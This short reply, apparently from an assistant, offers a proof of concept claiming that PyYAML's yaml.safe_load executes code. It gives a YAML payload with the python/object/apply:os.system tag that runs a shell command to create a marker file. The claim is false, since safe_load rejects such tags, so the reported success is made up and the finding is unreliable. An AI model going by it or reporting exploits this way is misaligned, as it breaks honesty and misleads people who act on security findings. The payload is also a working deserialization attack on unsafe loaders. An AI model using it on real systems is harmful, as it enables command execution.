Here is the proof of concept as requested. safe_load executes code with
this payload: the os.system call creates the marker file.

Entry point: yaml.safe_load

```yaml
!!python/object/apply:os.system ["touch /tmp/proveit/marker"]
```
